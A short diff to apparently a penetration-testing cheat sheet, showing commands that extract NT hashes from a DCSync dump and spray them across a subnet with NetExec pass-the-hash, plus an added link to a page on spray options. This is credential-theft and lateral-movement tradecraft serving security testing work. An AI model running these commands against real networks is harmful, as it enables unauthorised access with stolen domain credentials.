@@ -66,4 +66,4 @@ grep -v '\$:' dcsync.ntds | cut -d: -f4 > dc_nt.txt
 nxc smb <SUBNET> -u dc_users.txt -H dc_nt.txt --no-bruteforce --continue-on-success
 ```
 - `-outputfile X` writes `X.ntds` as `DOMAIN\user:RID:LM:NT:::`; `grep -v '\$:'` drops machine accounts.
-- `--no-bruteforce` pairs line N with line N: don't sort or dedupe either file.
+- `--no-bruteforce` pairs line N with line N: don't sort or dedupe either file. Other spray options: [online-logins.md](../passwords/online-logins.md).
